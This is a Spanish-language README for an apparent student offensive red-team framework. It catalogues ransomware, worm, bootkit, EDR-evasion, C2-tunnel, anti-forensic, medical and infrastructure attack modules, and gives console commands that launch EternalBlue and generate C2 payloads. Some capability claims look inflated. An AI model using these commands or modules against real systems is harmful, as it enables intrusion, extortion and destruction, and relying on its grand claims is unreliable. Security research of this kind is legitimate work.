<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,3,6,8&height=180&section=header&text=X404X&fontSize=50&fontColor=ffffff&animation=fadeIn&desc=Autonomous%20Red%20Team%20Platform&descAlignY=68&descSize=18" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.22+-00ADD8?style=for-the-badge&logo=go&logoColor=white" />
  <img src="https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Vue-3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white" />
  <img src="https://img.shields.io/badge/C-Kernel-CC0000?style=for-the-badge&logo=c&logoColor=white" />
  <img src="https://img.shields.io/badge/gRPC-Protocol-4285F4?style=for-the-badge&logo=google&logoColor=white" />
  <img src="https://img.shields.io/badge/Docker-Lab-2496ED?style=for-the-badge&logo=docker&logoColor=white" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-v3.2-red?style=flat-square" />
  <img src="https://img.shields.io/badge/Handlers-107-purple?style=flat-square" />
  <img src="https://img.shields.io/badge/Modules-154+-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/Kill%20Chain-8%20Phases-FF4500?style=flat-square" />
  <img src="https://img.shields.io/badge/AI-Ollama%20%2B%20Specter-00FF00?style=flat-square" />
  <img src="https://img.shields.io/badge/Crypto-X25519%20%2B%20XChaCha20-6C63FF?style=flat-square" />
  <img src="https://img.shields.io/badge/Submodules-11-9cf?style=flat-square" />
  <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square" />
</p>

---

> ⚠️ **AUTHORIZED USE ONLY** — Este framework es exclusivamente para evaluaciones de seguridad autorizadas, competiciones CTF, investigación académica y entornos de laboratorio controlados. El autor no se hace responsable del mal uso. Eres responsable de cumplir con todas las leyes aplicables.

---

## ¿Qué es X404X?

**X404X** es una plataforma de Red Team **autónoma** que cubre la cadena de ataque completa (Cyber Kill Chain) — desde reconocimiento hasta exfiltración y destrucción. Integra **11 herramientas ofensivas especializadas** en un monorepo unificado con protocolo gRPC, comunicación cifrada, toma de decisiones con IA (Ollama offline), persistencia a nivel kernel, y un dashboard web Vue 3.

Proyecto TFG (Trabajo de Fin de Grado) en Ciberseguridad — Cisco NetAcad, Málaga.

---

## v3.2 — Novedades

| Área | Qué |
|------|-----|
| **107 handlers reales** | v26-v210, BlockZ — 0 stubs, todos ejecutan operaciones reales de sistema |
| **Orquestación autónoma** | Feedback loop módulos→WorldGraph, dispatch al bridge, killchain auto-chain con 3 reintentos |
| **C2 indetectable** | DNS tunnel, ICMP tunnel, dead drops, CDN fronting, canales polimórficos |
| **Self-healing** | Watchdog con 7 persistencias, triple redundancia, process hollowing |
| **Anti-forense** | MFT timestomp, USN journal poison, prefetch poison, registry wipe, log toxin |
| **Bootkit UEFI** | DXE driver real, ESP hijack, immutable hiding |
| **LOLBin delivery** | 10 técnicas: certutil, mshta, regsvr32, msbuild, wmic, bitsadmin, cmstp, fodhelper |
| **Dashboard auth** | JWT HMAC-SHA256, rate limiting, health checks |
| **CI/CD** | GitHub Actions: lint, test, build, security scan |
| **One-click deploy** | `./scripts/deploy.sh --prod` levanta todo |

---

## Módulos por Versión

| Versión | Módulos | Destacados |
|---------|---------|------------|
| **v2.0-v2.5** | 46 | EternalBlue, BlueKeep, Zerologon, Propagación, Scanner, Hydra Crypto, RaaS, Supply Chain, SCADA, Hardware Kill |
| **v2.6** | 8 | POMDP táctico, AI Negotiate (Ollama), Evasion Deep, Bootkit SMM, MOBILE-X, Cloud Nemesis, Social C2 DoH, Block Omega |
| **v2.7** | 10 | UEFI Bootkit SPI, Hypervisor Ring -1, PCIe Rootkit DMA, Kernel eBPF, Secure Boot Bypass, Phishing Arsenal (DGA + Spear Phish AI + Smishing + Vishing) |
| **v2.8** | 23 | IoT Identity Theft, False Memory Injection, Thousand Cuts DB, PatchGuard Bypass, Keyboard LED Exfil, Zombie Army, SEO Sabotage, Inception Hypervisor, ISP BGP Hijack, Power Grid Harmonics, VR Spyware, Global AI Poison, Bio-Cyber DNA |
| **v2.9** | 24 | HDD Firmware Destroy, VRM Overvoltage, Acoustic Resonance, PSU Corrupt, USB Killer, Centrifuge Resonance, Medical Tamper, Intel ME Flash, NIC Persist, MFT Bitmap, DNS Poison, Digital Thermite, Honey Token Detection |
| **v2.10** | 2 | Apocalipsis (destrucción total + worm + botnet), Phantom Evasion (AMSI/ETW/Defender kill + sandbox detect + process hollowing + polymorphic mutation) |
| **Block Z** | 14 | Genetic Evolution, Deepfake Pipeline, SCADA Covert, Firmware Worm, Medical Attack, Model Poison, Disinformation, Airgap Exfil, Post-Quantum (Kyber-1024), Dead Man Switch, False Flag (APT impersonation), EDR Kill, Financial Crash, IoT Chain |

**Total: 107 handlers bridge Python + 47+ módulos Go = 154+ módulos**

---

## Arquitectura

```
                     ┌─────────────────────────────────┐
                     │        USER INTERFACES           │
                     │ CLI · Console · TUI · Dashboard  │
                     └────────┬───────────────┬─────────┘
                              │               │
                     ┌────────▼───────────────▼─────────┐
                     │          ORCHESTRATOR             │
                     │  Campaign Mgr │ Decision Engine   │
                     │  Rules(25%) + A*(35%) + AI(40%)  │
                     │  WorldGraph · EventBus · KillChain│
                     │  AutoMode · Dispatcher            │
                     └────────┬─────────────────────────┘
                              │ gRPC (X25519+XChaCha20)
                     ┌────────▼─────────────────────────┐
                     │        C2 SERVER (Go/gRPC)       │
                     │  AgentService · C2Service        │
                     │  TCP · HTTP · DNS · ICMP · DoH   │
                     └────────┬─────────────────────────┘
                              │ gRPC encrypted
                     ┌────────▼─────────────────────────┐
                     │        UNIFIED AGENT (Go)        │
                     │  Connector · BridgeClient        │
                     │  StealthC2 · Watchdog            │
                     └──┬──────┬───────┬──────┬─────────┘
                        │      │       │      │
                        │      │       │      └── Python Bridge (107 handlers)
                        │      │       └── Rise-Privilege (submodule)
                        │      └── Vault-Kernel (submodule)
                        └── Breach-Entry (submodule)
```

---

## Quick Start

```bash
# Clonar con submódulos
git clone --recurse-submodules https://github.com/Ruby570bocadito/X404X.git
cd X404X

# Deploy one-click (recomendado)
./scripts/deploy.sh --dev
# → http://localhost:8443

# Docker Lab
make lab-up
# → Attacker: docker exec -it x404x-attacker bash
# → Dashboard: http://localhost:3000

# Build & Test
make build        # Construye CLI + agentes (linux/amd64/arm64/windows)
make test         # Go test + Python test
```

---

## Uso Rápido

```bash
# Consola msfconsole-style
./x404x console
x404x> campaign start --name demo --target 10.0.0.0/24
x404x> search smb
x404x> use exploit/eternalblue
x404x> set RHOSTS 10.0.0.10
x404x> exploit
x404x> sessions -i 1
x404x> killchain              # Ver progreso

# CLI directa
x404x campaign start --name demo --target 10.0.0.0/24 --auto
x404x payload generate --os windows --c2 10.0.0.1:8443 --evasion stealth
x404x recon scan --target 10.0.0.10
x404x ai suggest
x404x listeners add --type tcp --port 8443

# Dashboard web
x404x dashboard
# → http://localhost:8443
```

---

## Estructura del Proyecto

```
X404X/
├── cmd/x404x/                # CLI entry point (Go + Cobra)
├── internal/                  # Código Go privado
│   ├── agent/                # Agente unificado + stealth C2 + watchdog
│   ├── api/                  # API REST + WebSocket + auth JWT
│   ├── appstate/             # Estado compartido + deployment manager
│   ├── c2server/             # Servidor gRPC C2
│   ├── crypto/               # X25519 + XChaCha20-Poly1305
│   ├── defense/              # BlueForge metrics
│   ├── dispatch/             # Dispatcher de decisiones → módulos
│   ├── orchestrator/         # Motor de decisiones + killchain + AutoMode
│   ├── ransomware/           # Motor ransom (Hydra, 30+ archivos)
│   └── registry/             # Registro de módulos
├── pkg/                       # Código Go público
│   ├── proto/                # Definiciones gRPC (agent, c2, bridge, common)
│   └── shared/               # Config, logger, types, database
├── modules/                   # Código Python nativo
│   ├── bridge/               # IPC Go-Python (107 handlers)
│   ├── evasion/              # LOLBin delivery + evasión
│   ├── phantom/              # PhantomWeb browser implant
│   └── notifications/        # Webhooks (Slack, Discord, Telegram)
├── plugins/                   # Submódulos externos (11)
│   ├── ai/                   # Specter-Terminal + Apex-Automation
│   ├── blue/                 # BlueForge-Suite
│   ├── breach/               # Breach-Entry (CVE-2026-XXXX)
│   ├── kernel/               # Vault-Kernel (LKM)
│   ├── operations/           # Titan-Operations
│   ├── privesc/              # Rise-Privilege
│   ├── pulse-c2/             # Pulse-C2
│   ├── recon/                # Horizon-Intel
│   ├── relay/                # Link-Relay
│   └── worm/                 # Wormy-ML
├── web/                       # Dashboard Vue 3
├── mobile/                    # Android/iOS (stubs)
├── lab/                       # Docker lab + CTF scenarios
├── dist/                      # Binarios compilados (gitignored)
├── docs/                      # Documentación completa
│   ├── USAGE.md              # Guía operacional
│   ├── COMMANDS.md           # 52 comandos CLI
│   ├── CONSOLE.md            # 25+ comandos consola
│   ├── MODULES.md            # 107 handlers catalogados
│   ├── CREATIVITY.md         # 8 features innovadoras
│   ├── ARCHITECTURE.md       # Arquitectura detallada
│   └── ROADMAP.md            # Plan de desarrollo
├── scripts/                   # deploy.sh, setup.sh, build scripts
├── config.yaml               # Configuración central
├── Makefile                  # Build orchestration
└── go.work                   # Go workspace
```

---

## Seguridad y Criptografía

| Componente | Algoritmo | Propósito |
|-----------|-----------|-----------|
| Key Exchange | X25519 ECDH | Claves de sesión efímeras |
| AEAD Cipher | XChaCha20-Poly1305 | Cifrado simétrico autenticado |
| Ransomware | AES-256-GCM + XChaCha20 (doble capa) | Cifrado de archivos |
| Ransomware Key | RSA-4096 + Shamir 3-of-3 | Protección de claves |
| Transport | TLS 1.3 (mTLS) | Autenticación servicio a servicio |
| Post-Quantum | Kyber-1024 (lattice-based) | Resistencia a ordenadores cuánticos |
| Dashboard Auth | JWT HMAC-SHA256 | Autenticación web |

---

## Controles de Seguridad

| Control | Descripción | Default |
|---------|-------------|---------|
| Kill Switch | Parada de emergencia todos los agentes | Enabled |
| Geofencing | Solo redes RFC 1918 | Enabled |
| Auto-Destruct | Auto-terminación tras N horas | 2h |
| Max Infections | Parar tras N hosts comprometidos | 1000 |
| No Persistence | Sobrevivir reinicio = false | Enabled |
| Rate Limiting | 100 req/min por IP en API | Enabled |

---

## Documentación

| Documento | Contenido |
|-----------|-----------|
| [USAGE.md](docs/USAGE.md) | Guía operacional completa (payload, campaña, consola, dashboard) |
| [COMMANDS.md](docs/COMMANDS.md) | Referencia de 52 comandos CLI con ejemplos |
| [CONSOLE.md](docs/CONSOLE.md) | Referencia de consola msfconsole-style + workflow de ataque |
| [MODULES.md](docs/MODULES.md) | Catálogo de 107 handlers con parámetros y ejemplos |
| [CREATIVITY.md](docs/CREATIVITY.md) | 8 features innovadoras documentadas |
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Arquitectura técnica detallada |
| [ROADMAP.md](docs/ROADMAP.md) | Plan de desarrollo y estado actual |

---

## TFG — Trabajo de Fin de Grado

Este framework es el proyecto central del TFG en Ciberseguridad. La memoria técnica documenta:
- Cada componente y su integración
- Metodología de pruebas en laboratorio
- Análisis ético y legal
- Métricas de defensa (validación BlueForge-Suite)

> **Autor:** Rafael Gálvez — [@Ruby570bocadito](https://github.com/Ruby570bocadito)
> **Centro:** Cisco NetAcad · Málaga, España

---

## License

MIT License — ver [LICENSE](LICENSE).

---

<p align="center">
  <b>Built with passion for offensive security research</b><br/>
  <sub>"The best way to understand defense is to build the attack."</sub>
</p>
